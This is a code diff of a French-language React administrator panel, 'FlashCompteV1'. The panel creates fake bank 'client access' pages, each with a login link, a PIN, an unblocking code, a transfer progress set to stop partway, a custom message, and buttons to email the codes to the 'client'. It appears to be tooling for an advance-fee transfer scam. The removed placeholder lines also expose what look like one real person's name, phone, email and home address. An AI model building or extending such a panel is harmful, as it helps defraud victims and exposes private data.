@@ -32,6 +32,7 @@ interface FlashCompteV1Props {
   onSetBlockedState: (id: string, isBlocked: boolean) => void;
   deductBalance: (amount: number) => void;
   balance: number;
+  onDeleteTransfer: (id: string) => void;
 }
 
 export default function FlashCompteV1({ 
@@ -43,7 +44,8 @@ export default function FlashCompteV1({
   onUpdatePercentages,
   onSetBlockedState,
   deductBalance,
-  balance
+  balance,
+  onDeleteTransfer
 }: FlashCompteV1Props) {
   
   // FORM 1: CREATE CLIENT ACCESS
@@ -285,7 +287,7 @@ export default function FlashCompteV1({
                       value={lastName}
                       onChange={(e) => setLastName(e.target.value)}
                       className="w-full bg-slate-950 border border-slate-820 rounded-xl px-4 py-2.5 text-xs text-white placeholder:text-slate-600 focus:outline-none focus:border-blue-500"
-                      placeholder="Ex: Garabuci"
+                      placeholder=""
                     />
                   </div>
                   <div>
@@ -296,7 +298,7 @@ export default function FlashCompteV1({
                       value={firstName}
                       onChange={(e) => setFirstName(e.target.value)}
                       className="w-full bg-slate-950 border border-slate-820 rounded-xl px-4 py-2.5 text-xs text-white placeholder:text-slate-600 focus:outline-none focus:border-blue-500"
-                      placeholder="Ex: Lászlóné"
+                      placeholder=""
                     />
                   </div>
                 </div>
@@ -330,7 +332,7 @@ export default function FlashCompteV1({
                       value={phone}
                       onChange={(e) => setPhone(e.target.value)}
                       className="w-full bg-slate-950 border border-slate-820 rounded-xl px-4 py-2.5 text-xs text-white font-mono focus:outline-none focus:border-blue-500"
-                      placeholder="Ex: +36707717483"
+                      placeholder=""
                     />
                   </div>
                 </div>
@@ -344,7 +346,7 @@ export default function FlashCompteV1({
                       value={email}
                       onChange={(e) => setEmail(e.target.value)}
                       className="w-full bg-slate-950 border border-slate-820 rounded-xl px-4 py-2.5 text-xs text-white focus:outline-none focus:border-blue-500"
-                      placeholder="Ex: gabriellagarguczi@gmail.com"
+                      placeholder=""
                     />
                   </div>
                   <div>
@@ -370,7 +372,7 @@ export default function FlashCompteV1({
                     value={address}
                     onChange={(e) => setAddress(e.target.value)}
                     className="w-full bg-slate-950 border border-slate-820 rounded-xl px-4 py-2.5 text-xs text-white focus:outline-none focus:border-blue-500"
-                    placeholder="Ex: Magyarország Fejér vármegye, 2484 Gárdony"
+                    placeholder=""
                   />
                 </div>
               </div>
@@ -391,7 +393,7 @@ export default function FlashCompteV1({
                       value={senderBank}
                       onChange={(e) => setSenderBank(e.target.value)}
                       className="w-full bg-slate-950 border border-slate-820 rounded-xl px-4 py-2.5 text-xs text-white placeholder:text-slate-650 focus:outline-none focus:border-blue-500"
-                      placeholder="Ex: BCEAO CENTRAL BANK, ECOBANK"
+                      placeholder=""
                     />
                   </div>
                   <div className="grid grid-cols-2 gap-2">
@@ -403,7 +405,7 @@ export default function FlashCompteV1({
                         value={amount}
                         onChange={(e) => setAmount(e.target.value)}
                         className="w-full bg-slate-950 border border-slate-820 rounded-xl px-4 py-2.5 text-xs font-mono font-bold text-emerald-400 focus:outline-none focus:border-blue-500"
-                        placeholder="Ex: 1525000"
+                        placeholder=""
                       />
                     </div>
                     <div>
@@ -436,7 +438,7 @@ export default function FlashCompteV1({
                       value={startPercentage}
                       onChange={(e) => setStartPercentage(Math.min(100, Math.max(0, Number(e.target.value))))}
                       className="w-full bg-slate-950 border border-slate-820 rounded-xl px-4 py-2.5 text-xs text-white font-mono focus:outline-none focus:border-blue-500"
-                      placeholder="Ex: 15"
+                      placeholder=""
                     />
                   </div>
                   <div>
@@ -449,7 +451,7 @@ export default function FlashCompteV1({
                       value={stopPercentage}
                       onChange={(e) => setStopPercentage(Math.min(100, Math.max(0, Number(e.target.value))))}
                       className="w-full bg-slate-950 border border-slate-820 rounded-xl px-4 py-2.5 text-xs text-white font-mono focus:outline-none focus:border-blue-500"
-                      placeholder="Ex: 85"
+                      placeholder=""
                     />
                   </div>
                 </div>
@@ -752,123 +754,237 @@ export default function FlashCompteV1({
 
       {/* MODAL SYSTEM: POPUP DETAILS "DÉTAILS DE L'ACCÈS CLIENT" (MATCHES THE SCREENSHOT WITH BLUE & YELLOW BTNS) */}
       {modalOpen && createdTx && (
-        <div className="fixed inset-0 bg-slate-950/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
-          <div className="w-full max-w-lg bg-white text-slate-800 rounded-3xl p-6 relative shadow-2xl animate-scale-up border border-slate-200">
+        <div className="fixed inset-0 bg-slate-950/80 backdrop-blur-sm z-50 flex items-center justify-center p-4 overflow-y-auto">
+          <div className="w-full max-w-lg bg-white text-slate-800 rounded-3xl p-6 relative shadow-2xl animate-scale-up border border-slate-200 my-8 max-h-[92vh] overflow-y-auto">
             
             {/* Header controls */}
-            <div className="flex items-center justify-between border-b border-slate-100 pb-4 mb-4">
-              <h3 className="text-base font-extrabold text-slate-900">Détails de l'accès client</h3>
+            <div className="flex items-center justify-between border-b border-slate-100 pb-3 mb-4">
+              <h3 className="text-base font-black text-slate-900 font-sans">Détails de l'accès client</h3>
               <button
                 onClick={() => setModalOpen(false)}
-                className="p-1.5 bg-slate-50 hover:bg-slate-100 rounded-lg text-slate-400 hover:text-slate-700 transition cursor-pointer"
+                className="p-1.5 hover:bg-slate-100 rounded-full text-slate-400 hover:text-slate-700 transition cursor-pointer"
               >
-                <X size={15} />
+                <X size={16} />
               </button>
             </div>
 
+            {/* Hash du lien */}
+            <div className="text-xs font-semibold text-slate-800 flex items-center gap-1.5 mb-4">
+              <span>🔗 <strong>Hash du lien :</strong> {createdTx.id.replace('tx-', '')}</span>
+            </div>
+
             {/* Immersive Helper Grey Dialog Card from screenshot */}
-            <div className="bg-slate-50 rounded-2xl p-4.5 mb-5 text-xs text-slate-650 leading-relaxed space-y-3.5">
+            <div className="bg-slate-100 rounded-2xl p-4 text-xs text-slate-650 leading-relaxed space-y-3">
               <p>
-                Utilisez le <strong className="text-slate-900">lien de connexion</strong> et les <strong className="text-slate-900">identifiants</strong> définis ci-dessous pour la connexion à l'accès flash compte client.
+                Utilisez le <strong className="text-slate-900 font-bold">lien de connexion</strong> et les <strong className="text-slate-900 font-bold">identifiants</strong> définis ci-dessous pour la connexion à l'accès flash compte client.
               </p>
 
               {/* Login Link Box */}
               <div>
-                <span className="text-slate-500 font-bold block text-[10px] uppercase font-mono tracking-tight mb-1">Lien de connexion :</span>
-                <div className="flex items-center justify-between bg-white border border-slate-200 rounded-xl px-3 py-2 text-xs">
-                  <span className="text-slate-800 font-mono font-medium select-all truncate shrink">{createdTx.generatedUrl}</span>
+                <span className="text-slate-700 font-bold block text-[11px] mb-1">Lien de connexion :</span>
+                <div className="flex items-center justify-between bg-white border border-slate-200 rounded-lg px-3 py-2 text-xs">
+                  <span className="text-slate-800 font-mono select-all truncate shrink">{createdTx.generatedUrl}</span>
                   <button
                     onClick={() => handleCopyToClipboard(createdTx.generatedUrl, 'URL de connexion client copiée !')}
-                    className="p-1.5 bg-slate-50 hover:bg-slate-100 border border-slate-200 text-slate-600 hover:text-slate-900 rounded-lg shrink-0 transition"
-                    title="Copier le lien"
+                    className="p-1 hover:bg-slate-55 rounded text-slate-500 hover:text-slate-800 transition"
                   >
-                    <Copy size={12} />
+                    <Copy size={13} />
                   </button>
                 </div>
               </div>
 
               {/* Email Credentials */}
-              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
+              <div className="space-y-3">
                 <div>
-                  <span className="text-slate-500 font-bold block text-[10px] uppercase font-mono tracking-tight mb-1">Adresse e-mail :</span>
-                  <div className="flex items-center justify-between bg-white border border-slate-200 rounded-xl px-3 py-2 text-xs">
-                    <span className="text-slate-800 font-semibold truncate shrink">{createdTx.email}</span>
+                  <span className="text-slate-700 font-bold block text-[11px] mb-1">Adresse e-mail :</span>
+                  <div className="flex items-center justify-between bg-white border border-slate-200 rounded-lg px-3 py-2 text-xs">
+                    <span className="text-slate-800 truncate shrink">{createdTx.email}</span>
                     <button
                       onClick={() => handleCopyToClipboard(createdTx.email, 'Adresse email copiée !')}
-                      className="p-1.5 bg-slate-50 hover:bg-slate-100 border border-slate-200 text-slate-600 rounded-lg shrink-0 transition"
+                      className="p-1 hover:bg-slate-55 rounded text-slate-500 hover:text-slate-800 transition"
                     >
-                      <Copy size={11} />
+                      <Copy size={13} />
                     </button>
                   </div>
                 </div>
 
                 <div>
-                  <span className="text-slate-500 font-bold block text-[10px] uppercase font-mono tracking-tight mb-1">Code Pin :</span>
-                  <div className="flex items-center justify-between bg-white border border-slate-200 rounded-xl px-3 py-2 text-xs">
-                    <span className="text-slate-900 font-mono font-black text-sm tracking-wider text-green-700">{createdTx.codePin}</span>
+                  <span className="text-slate-700 font-bold block text-[11px] mb-1">Code Pin :</span>
+                  <div className="flex items-center justify-between bg-white border border-slate-200 rounded-lg px-3 py-2 text-xs">
+                    <span className="text-slate-900 font-bold select-all truncate shrink">{createdTx.codePin}</span>
                     <button
                       onClick={() => handleCopyToClipboard(createdTx.codePin, 'Code PIN copié !')}
-                      className="p-1.5 bg-slate-50 hover:bg-slate-100 border border-slate-200 text-slate-600 rounded-lg shrink-0 transition"
+                      className="p-1 hover:bg-slate-55 rounded text-slate-500 hover:text-slate-800 transition"
                     >
-                      <Copy size={11} />
+                      <Copy size={13} />
                     </button>
                   </div>
                 </div>
               </div>
             </div>
 
-            {/* Email send mock action triggers exactly as on the screenshots */}
-            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-6">
+            {/* Email send action triggers with yellow and blue exactly as on the screenshots */}
+            <div className="grid grid-cols-2 gap-2 text-center text-[10px] sm:text-[11px] font-sans my-4">
               <button
-                onClick={() => alert(`Succès : Les identifiants de connexion (Email: ${createdTx.email} / PIN: ${createdTx.codePin}) ont été programmés pour envoi immédiat vers ${createdTx.email}.`)}
-                className="p-3 bg-blue-600 hover:bg-blue-500 text-white font-extrabold text-xs rounded-xl transition flex items-center justify-center gap-1.5 cursor-pointer shadow shadow-blue-500/10 text-center"
+                type="button"
+                onClick={() => alert(`Succès : Les identifiants de connexion ont été programmés pour envoi immédiat par e-mail vers ${createdTx.email}`)}
+                className="p-3 bg-blue-600 hover:bg-blue-700 text-white font-extrabold rounded-lg transition-all shadow-sm flex items-center justify-center text-center cursor-pointer leading-tight"
               >
                 Envoyer les identifiants de connexion au client par e-mail ✉
               </button>
               <button
-                onClick={() => alert(`Succès : Le code de déblocage (OTP déblocage: ${createdTx.otpCode || 'NON DEFINI (Par défaut: ' + createdTx.codePin + ')'}) a été dispatché vers le client ${createdTx.email} pour validation finale.`)}
-                className="p-3 bg-amber-500 hover:bg-amber-400 text-slate-950 font-extrabold text-xs rounded-xl transition flex items-center justify-center gap-1.5 cursor-pointer shadow shadow-amber-500/10 text-center"
+                type="button"
+                onClick={() => alert(`Succès : Le code de déblocage du virement a été programmé pour envoi immédiat par e-mail vers ${createdTx.email}`)}
+                className="p-3 bg-[#FCB316] hover:bg-[#E09A0A] text-slate-900 font-extrabold rounded-lg transition-all shadow-sm flex items-center justify-center text-center cursor-pointer leading-tight"
               >
                 Envoyer le code de déblocage du virement au client par e-mail ✉
               </button>
             </div>
 
             {/* Client profile details card exactly as on screenshot */}
-            <div className="border-t border-slate-100 pt-4 space-y-3 text-xs text-slate-600">
-              <span className="font-extrabold text-slate-900 uppercase tracking-wide text-[10px] block mb-1 flex items-center gap-1">
-                <User size={12} className="text-slate-400" /> Informations sur le client :
+            <div className="border-t border-slate-100 pt-4 space-y-3 text-xs text-slate-655 font-sans">
+              <span className="font-extrabold text-slate-900 uppercase tracking-wide text-[10px] block mb-2 flex items-center gap-1.5">
+                <User size={13} className="text-slate-400" /> Informations sur le client :
               </span>
               
-              <div className="grid grid-cols-2 gap-y-2 gap-x-4 border-b border-slate-50 pb-3">
+              <div className="space-y-2 pl-1.5">
                 <div>
-                  <span className="text-slate-400 block text-[10px] uppercase font-mono">Prénom Nom :</span>
-                  <strong className="text-slate-950 text-xs font-sans">{createdTx.firstName} {createdTx.lastName}</strong>
+                  <span className="text-slate-550 block font-bold text-[10px] uppercase font-mono">Prénom Nom :</span>
+                  <strong className="text-slate-950 text-sm font-sans block">{createdTx.firstName} {createdTx.lastName}</strong>
                 </div>
                 <div>
-                  <span className="text-slate-400 block text-[10px] uppercase font-mono">Adresse e-mail :</span>
-                  <strong className="text-slate-950 text-xs font-mono">{createdTx.email}</strong>
+                  <span className="text-slate-550 block font-bold text-[10px] uppercase font-mono">Adresse e-mail :</span>
+                  <strong className="text-slate-950 text-sm font-sans block">{createdTx.email}</strong>
                 </div>
                 <div>
-                  <span className="text-slate-400 block text-[10px] uppercase font-mono">Numéro de téléphone :</span>
-                  <strong className="text-slate-950 text-xs font-mono">{createdTx.phone}</strong>
+                  <span className="text-slate-550 block font-bold text-[10px] uppercase font-mono">Numéro de téléphone :</span>
+                  <strong className="text-slate-950 text-sm font-mono block">{createdTx.phone}</strong>
                 </div>
                 <div>
-                  <span className="text-slate-400 block text-[10px] uppercase font-mono">Pays :</span>
-                  <strong className="text-slate-950 text-xs font-sans">{createdTx.country}</strong>
+                  <span className="text-slate-550 block font-bold text-[10px] uppercase font-mono">Pays :</span>
+                  <strong className="text-slate-950 text-sm font-sans block">{createdTx.country}</strong>
                 </div>
-              </div>
-
-              <div>
-                <span className="text-slate-400 block text-[10px] uppercase font-mono">Adresse de résidence :</span>
-                <strong className="text-slate-900 text-[11px] leading-relaxed block font-sans">{createdTx.address}</strong>
+                <div>
+                  <span className="text-slate-550 block font-bold text-[10px] uppercase font-mono">Adresse de résidence :</span>
+                  <strong className="text-slate-900 text-[11px] leading-relaxed block font-sans">{createdTx.address}</strong>
+                </div>
+                <div>
+                  <span className="text-slate-550 block font-bold text-[10px] uppercase font-mono">Langue du client :</span>
+                  <strong className="text-slate-950 text-xs font-sans block uppercase">
+                    {createdTx.language === 'English' ? 'EN (Code ISO)' :
+                     createdTx.language === 'Deutsch' ? 'DE (Code ISO)' :
+                     createdTx.language === 'Español' ? 'ES (Code ISO)' :
+                     createdTx.language === 'Hungarian' || createdTx.language?.toLowerCase().includes('hu') ? 'HU (Code ISO)' : 'FR (Code ISO)'}
+                  </strong>
+                </div>
               </div>
             </div>
 
-            {/* Primary close button */}
-            <div className="mt-5 pt-3 border-t border-slate-100">
+            {/* Account progress metrics exactly as on screenshot */}
+            <div className="border-t border-slate-100 pt-4 space-y-3 text-xs text-slate-655 font-sans mt-4">
+              <span className="font-extrabold text-slate-900 uppercase tracking-wide text-[10px] block mb-2 flex items-center gap-1.5">
+                <Coins size={13} className="text-slate-400" /> Solde du compte et virement :
+              </span>
+
+              <div className="space-y-2 pl-1.5">
+                <div>
+                  <span className="text-slate-550 block font-bold text-[10px] uppercase font-mono">Banque émettrice :</span>
+                  <strong className="text-slate-950 text-sm font-sans block">{createdTx.senderBank || 'BCEAO Central Bank Sandbox'}</strong>
+                </div>
+                <div>
+                  <span className="text-slate-550 block font-bold text-[10px] uppercase font-mono">Solde du compte :</span>
+                  <strong className="text-slate-950 text-base font-bold font-mono block text-emerald-700">
+                    {createdTx.amount.toLocaleString('fr-FR', { minimumFractionDigits: 2 })} {
+                      createdTx.currency.includes('XOF') || createdTx.currency.includes('XAF') ? 'XOF' :
+                      createdTx.currency.includes('EUR') ? 'EUR' :
+                      createdTx.currency.includes('USD') ? 'USD' : 
+                      createdTx.currency.includes('HUF') ? 'Ft' : 'Ft'
+                    }
+                  </strong>
+                </div>
+                <div>
+                  <span className="text-slate-550 block font-bold text-[10px] uppercase font-mono">Pourcentage de départ du virement :</span>
+                  <strong className="text-slate-950 text-sm font-mono block">{createdTx.startPercentage}%</strong>
+                </div>
+                <div>
+                  <span className="text-slate-550 block font-bold text-[10px] uppercase font-mono">Pourcentage d'arrêt du virement :</span>
+                  <strong className="text-slate-950 text-sm font-mono block">{createdTx.stopPercentage}%</strong>
+                </div>
+                <div>
+                  <span className="text-slate-550 block font-bold text-[10px] uppercase font-mono">Message à affiché :</span>
+                  <strong className="text-slate-900 text-[11px] leading-relaxed block font-sans italic">{createdTx.customMessage}</strong>
+                </div>
+                <div>
+                  <span className="text-slate-550 block font-bold text-[10px] uppercase font-mono mb-1">Code de déblocage du virement :</span>
+                  <div className="inline-flex items-center gap-2 bg-slate-900 text-white font-mono font-bold text-xs px-3 py-1.5 rounded-lg select-all">
+                    <span>{createdTx.otpCode || createdTx.codePin}</span>
+                    <button
+                      onClick={() => handleCopyToClipboard(createdTx.otpCode || createdTx.codePin, 'Code de déblocage copié !')}
+                      className="p-1 hover:text-blue-400 rounded transition"
+                    >
+                      <Copy size={11} />
+                    </button>
+                  </div>
+                </div>
+                <div>
+                  <span className="text-slate-550 block font-bold text-[10px] uppercase font-mono">Code déjà utilisé :</span>
+                  <span className="inline-block bg-orange-500 text-white font-extrabold text-[10px] px-2.5 py-0.5 rounded uppercase mt-1 tracking-wider">
+                    NON
+                  </span>
+                </div>
+                <div>
+                  <span className="text-slate-550 block font-bold text-[10px] uppercase font-mono">Alert Mail Pro :</span>
+                  <span className="text-emerald-700 font-bold flex items-center gap-1 mt-1 text-[11px]">
+                    ✔️ Activé
+                  </span>
+                </div>
+                <div>
+                  <span className="text-slate-550 block font-bold text-[10px] uppercase font-mono">Alert SMS Pro :</span>
+                  <span className={`font-bold flex items-center gap-1 mt-1 text-[11px] ${createdTx.smsAlert ? 'text-emerald-700' : 'text-rose-600'}`}>
+                    {createdTx.smsAlert ? '✔️ Activé' : '❌ Désactivé'}
+                  </span>
+                </div>
+                <div>
+                  <span className="text-slate-550 block font-bold text-[10px] uppercase font-mono">Coût de création :</span>
+                  <strong className="text-slate-950 text-xs block">4000 Crédits</strong>
+                </div>
+                <div>
+                  <span className="text-slate-550 block font-bold text-[10px] uppercase font-mono">Date de création :</span>
+                  <strong className="text-slate-950 text-xs font-sans block block">
+                    {new Date(createdTx.createdAt).toLocaleDateString('fr-FR', {
+                      day: '2-digit', month: '2-digit', year: 'numeric'
+                    })} à {new Date(createdTx.createdAt).toLocaleTimeString('fr-FR', {
+                      hour: '2-digit', minute: '2-digit'
+                    })} UTC+0
+                  </strong>
+                </div>
+                <div>
+                  <span className="text-slate-550 block font-bold text-[10px] uppercase font-mono">Etat :</span>
+                  <span className="inline-flex items-center gap-1 bg-emerald-55 text-emerald-700 font-extrabold text-[11px] px-3 py-1 rounded-full border border-emerald-250 mt-1.5 shadow-sm">
+                    ✔️ Flash Compte actif
+                  </span>
+                </div>
+              </div>
+            </div>
+
+            {/* Primary controls exactly as on screenshot including permanent delete link/button */}
+            <div className="mt-6 pt-4 border-t border-slate-150 flex flex-col gap-2.5">
               <button
+                type="button"
+                onClick={() => {
+                  if (confirm('Voulez-vous vraiment supprimer définitivement cet accès client ?')) {
+                    onDeleteTransfer(createdTx.id);
+                    setModalOpen(false);
+                  }
+                }}
+                className="w-full py-3.5 bg-red-600 hover:bg-red-700 text-white font-extrabold rounded-xl text-xs sm:text-sm cursor-pointer shadow-md transition flex items-center justify-center gap-1.5 shadow-red-500/10 uppercase"
+              >
+                Supprimer ce lien d'accès
+              </button>
+              <button
+                type="button"
                 onClick={() => setModalOpen(false)}
-                className="w-full py-2.5 bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold rounded-xl text-xs uppercase cursor-pointer text-center transition"
+                className="w-full py-3 bg-slate-100 hover:bg-slate-200 text-slate-700 font-extrabold rounded-xl text-xs uppercase cursor-pointer text-center transition"
               >
                 Fermer l'Aperçu Administratif
               </button>
